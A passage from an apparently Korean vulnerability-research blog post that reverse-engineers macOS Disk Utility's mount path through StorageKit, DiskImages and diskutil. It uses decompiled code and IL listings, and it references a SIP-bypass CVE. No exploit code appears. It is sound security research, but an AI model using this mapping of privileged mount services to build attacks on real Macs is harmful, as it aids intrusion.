&#xC8FC;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD55C; &#xC801;&#xC7AC; &#xB610;&#xD55C; &#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xD310;&#xB2E8;&#xC774; &#xD544;&#xC694;&#xD55C; &#xAC83;&#xC774; &#xC77C;&#xBC18; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; &#xB2E4;&#xB978; &#xC810;&#xC774;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="2-Analyze-Suspicious-Method"><a href="#2-Analyze-Suspicious-Method" class="headerlink" title="2. Analyze Suspicious Method"></a>2. Analyze Suspicious Method</h2><h3 id="2-1-StorageKit-framework"><a href="#2-1-StorageKit-framework" class="headerlink" title="2.1. StorageKit.framework"></a>2.1. StorageKit.framework</h3><p>&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD55C; <code>[obj1 mountWithCompletionBlock:]</code>&#xC740; DSC &#xB0B4;&#xC5D0;&#xC11C; <code>-[SKDisk mountWithCompletionBlock:]</code>&#xC73C;&#xB85C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xB0B4;&#xBD80; &#xD638;&#xCD9C; &#xC21C;&#xC11C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC9C4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;:</p><ol><li><code>-[SKDisk mountWithCompletionBlock:]</code> </li><li><code>-[SKDisk mountWithOptions:withCompletionBlock:]</code></li><li><code>-[SKDisk mountWithOptionsDictionary:withCompletionBlock:]</code></li><li><code>-[SKHelperClient mountDisk:options:completionBlock:]</code></li><li><code>-[SKHelperClient mountDisk:options:blocking:completionBlock:]</code> </li></ol><p>&#xC815;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xACBD;&#xC6B0; <code>-[SKHelperClient mountDisk:options:blocking:completionBlock:]</code> &#xBA54;&#xC11C;&#xB4DC;&#xC5D0;&#xC11C; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>[obj_9 mountDisk:obj_6 options:obj_1 withCompletionUUID:obj_5]</code> &#xBA54;&#xC11C;&#xB4DC;&#xC5D0; &#xAD00;&#xD55C; &#xAD6C;&#xD604;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC5C6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; <code>obj_9</code>&#xC774; &#xC815;&#xC758;&#xB418;&#xB294; &#xACF3;&#xC758; &#xBD84;&#xC11D;&#xC774; &#xD544;&#xC694;&#xD55C;&#xB370; &#xD574;&#xB2F9; &#xAC12;&#xC740; <code>[[self remoteObjectWithUUID:obj_5 errorHandler:&amp;stack_block_var_b8] retain];</code> &#xC73C;&#xB85C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">id</span> obj_9 =    [[<span class="hljs-keyword">self</span> remoteObjectWithUUID:obj_5 errorHandler:&amp;stack_block_var_b8] <span class="hljs-keyword">retain</span>];obj_6 = [[obj_2 minimalDictionaryRepresentation] <span class="hljs-keyword">retain</span>];[obj_2 release];[obj_9 mountDisk:obj_6 options:obj_1 withCompletionUUID:obj_5];</code></pre><p>&#xB0B4;&#xBD80; &#xAD6C;&#xD604;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB824;&#xBA74; <code>-[SKHelperClient remoteObjectWithUUID:errorHandler:]</code> &#xBA54;&#xC11C;&#xB4DC;&#xC758; &#xD655;&#xC778;&#xC774; &#xD544;&#xC694;&#xD558;&#xBA70; &#xC8FC;&#xC694; &#xB3D9;&#xC791;&#xC740; XPC &#xC5F0;&#xACB0; &#xACFC;&#xC815;&#xC744; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec">    <span class="hljs-keyword">id</span> -[<span class="hljs-built_in">SKHelperClient</span> remoteObjectWithUUID:errorHandler:](<span class="hljs-keyword">struct</span> <span class="hljs-built_in">SKHelperClient</span>* <span class="hljs-keyword">self</span>, SEL sel, <span class="hljs-keyword">id</span> remoteObjectWithUUID, <span class="hljs-keyword">id</span> errorHandler, <span class="hljs-keyword">void</span>* arg)    {        <span class="hljs-keyword">id</span> obj = [remoteObjectWithUUID <span class="hljs-keyword">retain</span>];        <span class="hljs-keyword">id</span> obj_1 = [errorHandler <span class="hljs-keyword">retain</span>];        <span class="hljs-keyword">id</span> obj_4 = [[<span class="hljs-keyword">self</span> xpcQueue] <span class="hljs-keyword">retain</span>];        <span class="hljs-keyword">struct</span> Block_literal_7ff917e939a3 stack_block_var_70;        stack_block_var_70.isa = &amp;__NSConcreteStackBlock;        stack_block_var_70.flags = <span class="hljs-number">0xc2000000</span>;        stack_block_var_70.reserved = <span class="hljs-number">0</span>;        stack_block_var_70.invoke =            ___52-[<span class="hljs-built_in">SKHelperClient</span> re...tWithUUID:errorHandler:]_block_invoke;        stack_block_var_70.descriptor = &amp;block_descriptor_7ff9426b8a90;        stack_block_var_70.strong_ptr_20 = <span class="hljs-keyword">self</span>;        stack_block_var_70.strong_ptr_30 = obj_1;        stack_block_var_70.strong_ptr_28 = obj;        <span class="hljs-keyword">id</span> obj_2 = [obj <span class="hljs-keyword">retain</span>];        <span class="hljs-keyword">id</span> obj_3 = [obj_1 <span class="hljs-keyword">retain</span>];        j__dispatch_async(obj_4, &amp;stack_block_var_70);        [obj_4 release];        obj_4 = [[<span class="hljs-keyword">self</span> xpcConnection] <span class="hljs-keyword">retain</span>];<span class="hljs-comment">// ...</span></code></pre><blockquote><p>XPC&#xB294; &#xACBD;&#xB7C9;&#xD654;&#xB41C; &#xB0B4;&#xBD80; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04; &#xD1B5;&#xC2E0;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xB85C; XPC &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC8FC;&#xACE0;&#xBC1B;&#xC744; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xC704; &#xBA54;&#xC11C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; XPC &#xC5F0;&#xACB0;&#xC5D0; &#xAD00;&#xD55C; &#xB0B4;&#xC6A9;&#xB9CC; &#xC874;&#xC7AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5B4;&#xB5A4; &#xB300;&#xC0C1;&#xACFC; &#xC5F0;&#xACB0;&#xB418;&#xB294;&#xC9C0; &#xC2DD;&#xBCC4;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xB2E4;&#xB978; &#xBA54;&#xC11C;&#xB4DC;&#xC758; &#xBD84;&#xC11D;&#xC774; &#xD544;&#xC694;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C;&#xB294; <code>-[SKHelperClient createXPCConnection]</code> &#xBA54;&#xC11C;&#xB4DC;&#xC5D0;&#xC11C; &#xD655;&#xC778; &#xAC00;&#xB2A5;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">void</span> -[<span class="hljs-built_in">SKHelperClient</span> createXPCConnection](<span class="hljs-keyword">struct</span> <span class="hljs-built_in">SKHelperClient</span>* <span class="hljs-keyword">self</span>, SEL sel){    <span class="hljs-keyword">id</span> rax = [[<span class="hljs-built_in">NSXPCConnection</span> alloc] initWithMachServiceName:<span class="hljs-string">@&quot;</span><span class="hljs-string">        com.apple.storagekitd&quot;</span> options:<span class="hljs-number">0x1000</span>];</code></pre><p>&#xC804;&#xB2EC;&#xB418;&#xB294; service name&#xC744; &#xD1B5;&#xD574; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC544;&#xB798; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xC2E4;&#xC81C;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ ps -ef | grep storagekitd | grep -v $$    0 35052     1   0 22Sep25 ??         0:09.17 /usr/libexec/storagekitd</code></pre><p>&#xBCF8; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xBA70; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xC2DC;&#xC2A4;&#xD15C; &#xAD6C;&#xC131;&#xC744; &#xD559;&#xC2B5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xACF5;&#xAC1C;&#xB41C; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC815;&#xBCF4; &#xC218;&#xC9D1;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>storagekitd</code>&#xC640; &#xAD00;&#xB828;&#xB41C; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D; &#xB0B4;&#xC6A9;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xACE0; &#xC774;&#xB294; &#xD328;&#xCE58; &#xB178;&#xD2B8; &#xC0C1;&#xC5D0; StorageKit&#xC73C;&#xB85C; &#xD45C;&#xAE30;&#xB41C; &#xC810;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xC815;&#xBCF4;&#xB97C; &#xC54C;&#xAC8C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC740; CVE-2024-44243&#xC73C;&#xB85C; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xD55C; &#xBCC4;&#xB3C4;&#xC758; &#xAE00; &#xB610;&#xD55C; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><a href="https://support.apple.com/ko-kr/121839">https://support.apple.com/ko-kr/121839</a><br><a href="https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/">https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/</a></p></blockquote><p>&#xD604;&#xC7AC; &#xBD84;&#xC11D; &#xC911;&#xC778; &#xCDE8;&#xC57D;&#xC810;&#xC774; Disk Utility&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB41C; &#xC810;&#xC744; &#xACE0;&#xB824;&#xD560; &#xB54C; &#xC774;&#xB294; &#xBC94;&#xC704; &#xC678;&#xB85C; &#xD310;&#xB2E8;&#xB418;&#xC5B4; &#xB2E4;&#xB978; &#xBCA1;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-2-DiskImages-framework"><a href="#2-2-DiskImages-framework" class="headerlink" title="2.2. DiskImages.framework"></a>2.2. DiskImages.framework</h3><p>&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xC758;&#xD574; &#xD638;&#xCD9C;&#xB41C; <code>_DIHLDiskImageAttach()</code> &#xD568;&#xC218;&#xB294; DSC &#xB0B4;&#xC5D0;&#xC11C; <strong>DiskImages.framework</strong>&#xB97C; &#xC801;&#xC7AC;&#xD558;&#xC5EC; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB0B4;&#xBD80; &#xB3D9;&#xC791;&#xC744; &#xC694;&#xC57D;&#xD558;&#xBA74; &#xD638;&#xCD9C; &#xB2F9;&#xC2DC; &#xB118;&#xACA8;&#xBC1B;&#xC740; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xAC01;&#xC885; &#xC635;&#xC158;&#xAC12;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xC5EC; &#xB515;&#xC154;&#xB108;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xC774; &#xB515;&#xC154;&#xB108;&#xB9AC;&#xB294; <code>[obj_2 performOperationReturning:&amp;theDict_1];</code> &#xD638;&#xCD9C; &#xC2DC; &#xCC38;&#xC870;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; <code>obj_2</code>&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">id</span> obj_2 = [[DIHelperProxy alloc] initWithDictionary:obj andStatusProc:arg2     andContext:arg3];<span class="hljs-keyword">if</span> (_DIGetDebugLevel())    _NSLog();int32_t rbx_3 = [obj_2 performOperationReturning:&amp;theDict_1];</code></pre><p>&#xC989;, &#xD638;&#xCD9C;&#xB41C; &#xBA54;&#xC11C;&#xB4DC;&#xC758; &#xC815;&#xBCF4;&#xB294; <code>-[DIHelperProxy performOperationReturning:]</code>&#xC5D0; &#xD574;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBA54;&#xC11C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; <code>NSThread</code>&#xB97C; &#xD1B5;&#xD574; &#xD558;&#xC704; &#xB3D9;&#xC791;&#xC744; &#xC2A4;&#xB808;&#xB4DC; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec">*(uint64_t*)performOperationReturning_1 = nullptr;[<span class="hljs-keyword">self</span>-&gt;_threadCondLock lock];[<span class="hljs-keyword">self</span>-&gt;_threadCondLock unlockWithCondition:<span class="hljs-number">1</span>];<span class="hljs-keyword">if</span> (_DIGetDebugLevel())    _NSLog();[<span class="hljs-built_in">NSThread</span> detachNewThreadSelector:<span class="hljs-keyword">@selector</span>(workerThread:) toTarget:<span class="hljs-keyword">self</span>     withObject:<span class="hljs-string">@&quot;workerThread:&quot;</span>];[<span class="hljs-keyword">self</span>-&gt;_threadCondLock lockWhenCondition:<span class="hljs-number">0</span>];[<span class="hljs-keyword">self</span>-&gt;_threadCondLock unlock];<span class="hljs-keyword">char</span> rax_7;</code></pre><p><code>detachNewThreadSelector</code> &#xBA54;&#xC11C;&#xB4DC; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xB294; selector&#xB97C; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xACE0; <code>-[DIHelperProxy workerThread:]</code> &#xBA54;&#xC11C;&#xB4DC; &#xB610;&#xD55C; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xC810;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>workerThread:</code>  &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>threadSetupServer</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC5F0;&#xACB0;&#xC744; &#xC704;&#xD55C; &#xC11C;&#xBC84; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec">    <span class="hljs-keyword">if</span> (![<span class="hljs-keyword">self</span> threadSetupServer])    {        <span class="hljs-keyword">if</span> (_DIGetVerboseLevel())            _NSLog();                <span class="hljs-keyword">self</span>-&gt;_threadResultsError = <span class="hljs-number">6</span>;    }    <span class="hljs-keyword">else</span>    {        int32_t rax_6 = [<span class="hljs-keyword">self</span> threadLaunchToolAuthenticated:(uint64_t)(int32_t)<span class="hljs-keyword">self</span>            -&gt;_withAuthentication];        <span class="hljs-keyword">self</span>-&gt;_threadResultsError = rax_6;<span class="hljs-comment">// ...</span>}</code></pre><p>&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xC5D0; &#xC131;&#xACF5;&#xD55C; &#xACBD;&#xC6B0; <code>threadLaunchToolAuthenticated:</code> &#xD750;&#xB984;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xB418;&#xBA70; &#xC2E4;&#xD589;&#xC5D0; &#xC2E4;&#xD328;&#xD55C; &#xACBD;&#xC6B0; &#xB85C;&#xADF8;&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xACE0; &#xC5D0;&#xB7EC; &#xB118;&#xBC84;&#xB97C; &#xC138;&#xD305;&#xD569;&#xB2C8;&#xB2E4;. &#xC5F0;&#xACB0;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xB294; XPC &#xB300;&#xC0C1;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">if</span> (!j__sandbox_check((uint64_t)j____getpid(), <span class="hljs-string">&quot;mach-lookup&quot;</span>, <span class="hljs-number">2</span>,     [<span class="hljs-string">@&quot;com.apple.system.hdiejectd.xpc&quot;</span> UTF8String])){</code></pre><h2 id="3-Other-Executable-File"><a href="#3-Other-Executable-File" class="headerlink" title="3. Other Executable File"></a>3. Other Executable File</h2><p>Application &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB358; &#xC911; <code>diskutil</code>&#xACFC; <code>hdiutil</code>&#xC5D0;&#xC11C;&#xB3C4; mount &#xC635;&#xC158;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB450; &#xB3C4;&#xAD6C; &#xBAA8;&#xB450; Command Line&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xB3C4;&#xAD6C;&#xB85C; &#xAC01; &#xC5ED;&#xD560;&#xACFC; &#xC704;&#xCE58;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ul><li><strong>diskutil</strong><ul><li><code>/usr/sbin/diskutil</code></li><li>&#xB85C;&#xCEEC; &#xB514;&#xC2A4;&#xD06C;&#xC640; &#xBCFC;&#xB968;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC720;&#xD2F8;&#xB9AC;&#xD2F0;</li></ul></li><li><strong>hdiutil</strong><ul><li><code>/usr/bin/hdiutil</code></li><li>&#xB514;&#xC2A4;&#xD06C; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xB2E4;&#xB8E8;&#xAE30; &#xC704;&#xD55C; &#xC720;&#xD2F8;&#xB9AC;&#xD2F0;</li></ul></li></ul><h3 id="3-1-diskutil"><a href="#3-1-diskutil" class="headerlink" title="3.1. diskutil"></a>3.1. diskutil</h3><p><code>diskutil</code>&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xB9C8;&#xC6B4;&#xD2B8;&#xB294; <code>mount</code>&#xC640; <code>mountDisk</code> &#xCD1D; &#xB450; &#xAC00;&#xC9C0; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC804;&#xC790;&#xC758; &#xACBD;&#xC6B0; &#xB2E8;&#xC77C; &#xBCFC;&#xB968;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD55C;&#xB2E4;&#xBA74; &#xD6C4;&#xC790;&#xB294; &#xD574;&#xB2F9; &#xB514;&#xC2A4;&#xD06C;&#xC758; &#xB9C8;&#xC6B4;&#xD2B8; &#xAC00;&#xB2A5;&#xD55C; &#xBAA8;&#xB4E0; &#xBCFC;&#xB968;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ diskutil Disk Utility ToolUtility to manage <span class="hljs-built_in">local</span> disks and volumesMost commands require an administrator or root userWARNING: Most destructive operations are not promptedUsage:  diskutil [quiet] &lt;verb&gt; &lt;options&gt;, <span class="hljs-built_in">where</span> &lt;verb&gt; is as follows:<span class="hljs-comment"># ...</span>     u[n]mount            (Unmount a single volume)     unmountDisk          (Unmount an entire disk (all volumes))     eject                (Eject a disk)     mount                (Mount a single volume)     mountDisk            (Mount an entire disk (all mountable volumes))<span class="hljs-comment"># ...</span></code></pre><p>&#xC6B0;&#xC120; &#xD234; &#xC2E4;&#xD589; &#xC774;&#xD6C4; &#xC635;&#xC158; &#xD30C;&#xC2F1;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xAE4C;&#xC9C0; &#xBD84;&#xC11D;&#xC744; &#xBAA9;&#xD45C;&#xB85C; &#xC9C4;&#xD589;&#xD558;&#xC600;&#xC73C;&#xBA70; &#xD750;&#xB984;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li><code>-[Main init]</code></li><li><code>-[Main run]</code></li><li><code>-[CommandLineInterface run]</code><ul><li>&#xC778;&#xC790;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;</li></ul></li><li>&#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0; <code>-[CommandLineInterface parseVerbAndDispatch:]</code> </li></ol><p>&#xC778;&#xC790;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; <code>-[CommandLineInterface parseVerbAndDispatch:]</code>&#xAE4C;&#xC9C0; &#xB3C4;&#xB2EC;&#xD558;&#xAC8C; &#xB418;&#xBA70; &#xD574;&#xB2F9; &#xBA54;&#xC11C;&#xB4DC;&#xC5D0;&#xC11C; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xC635;&#xC158;&#xC758; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC99D;&#xACFC; &#xC774;&#xC5D0; &#xB530;&#xB978; &#xCC98;&#xB9AC;&#xAC00; &#xC9C4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">if</span> (![rax_1 caseInsensitiveCompare:<span class="hljs-string">@&quot;mount&quot;</span>])    <span class="hljs-comment">/* tailcall */</span>    <span class="hljs-keyword">return</span> [[[DiskMount alloc] init] mount:entireDisk:];<span class="hljs-keyword">if</span> (![rax_1 caseInsensitiveCompare:<span class="hljs-string">@&quot;mountDisk&quot;</span>])    <span class="hljs-comment">/* tailcall */</span>    <span class="hljs-keyword">return</span> [[[DiskMount alloc] init] mount:entireDisk:];</code></pre><p>&#xC704; &#xCF54;&#xB4DC; &#xC2A4;&#xB2C8;&#xD3AB;&#xC740; <code>mount</code> &#xBC0F; <code>mountDisk</code>&#xC758; &#xCC98;&#xB9AC; &#xACFC;&#xC815;&#xC774;&#xBA70; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; <code>-[DiskMount mount:entireDisk:]</code> &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xC810;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD55C; Binary Ninja&#xC758; Pesudo Objective-C&#xC758; &#xC624;&#xB958;&#xB85C; <code>entireDisk:</code> &#xD544;&#xB4DC;&#xC5D0; &#xB300;&#xD55C; &#xAC12;&#xC774; &#xB204;&#xB77D;&#xB418;&#xC5C8;&#xC73C;&#xB098; assembly &#xD639;&#xC740; LLIL&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD558;&#xBA74; <code>mount</code>&#xB97C; &#xD1B5;&#xD55C; &#xD638;&#xCD9C; &#xC2DC; &#xC774;&#xB97C; &#x2018;0&#x2019;&#xC73C;&#xB85C; &#xC138;&#xD305;&#xD558;&#xBA70; <code>mountDisk</code>&#xB85C; &#xD638;&#xCD9C; &#xC2DC; &#x2018;1&#x2019;&#xB85C; &#xC138;&#xD305;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs nasm">  72 @   rdi = rax  73 @   rdx = rbx  74 @   ecx = 0  75 @   goto 89 @ 0x1000053c7// ...  89 @   rsp = rsp + 8  90 @   rbx = pop  91 @   r12 = pop  92 @   r13 = pop  93 @   r14 = pop  94 @   r15 = pop  95 @   rbp = pop  96 @   &lt;return&gt; tailcall([_objc_msgSend].q)// ...   119 @   rdx = &amp;cfstr_mount 120 @   rdi = r15 121 @   rsi = r12 122 @   call([_objc_msgSend].q) 123 @   if (rax == 0) then 124 @ 0x1000053f0 else 128 @ 0x100004d94 124 @   rdi = &amp;cls_DiskMount 125 @   call(_objc_alloc_init) 126 @   rsi = [&amp;selRef_mount:entireDisk:].q 127 @   goto 72 @ 0x100005372</code></pre><p>&#xC9C4;&#xD589; &#xD750;&#xB984;&#xC744; &#xC694;&#xC57D;&#xD558;&#xBA74; 119&#xBC88; &#xC904;&#xC5D0;&#xC11C; <code>mount</code> &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBD88;&#xB7EC;&#xC640; &#xBE44;&#xAD50;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. 123&#xBC88; &#xC904;&#xC758; &#xBD84;&#xAE30;&#xBB38;&#xC5D0;&#xC11C; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xACBD;&#xC6B0; 124&#xBC88;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD558;&#xBA70; &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; 128&#xBC88;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>124&#xBC88;&#xC758; &#xC9C4;&#xD589; &#xD750;&#xB984;&#xC744; &#xB530;&#xB77C;&#xAC00;&#xBA74; &#xD544;&#xC694;&#xD55C; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xCD08;&#xAE30;&#xD654; &#xD6C4; &#xBA54;&#xC11C;&#xB4DC; &#xD638;&#xCD9C;&#xC744; &#xC704;&#xD55C; &#xC140;&#xB809;&#xD130; &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; 72&#xBC88; &#xC904;&#xB85C; &#xBD84;&#xAE30;&#xD569;&#xB2C8;&#xB2E4;.</p><p>72&#xBC88; &#xC904;&#xC5D0;&#xC11C;&#xB294; &#xD544;&#xC694;&#xD55C; &#xC778;&#xC790;&#xB97C; &#xC138;&#xD305;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xAC00;&#xC9C0;&#xB294;&#xB370; <code>objc_msgSend()</code>&#xC758; calling convention&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ul><li><em>rdi</em>: instance</li><li><em>rsi</em>: selector</li><li><em>rdx</em>: first argument</li><li><em>rcx</em>: second argument</li></ul><p>&#xC5EC;&#xAE30;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xBA54;&#xC11C;&#xB4DC;&#xB294; 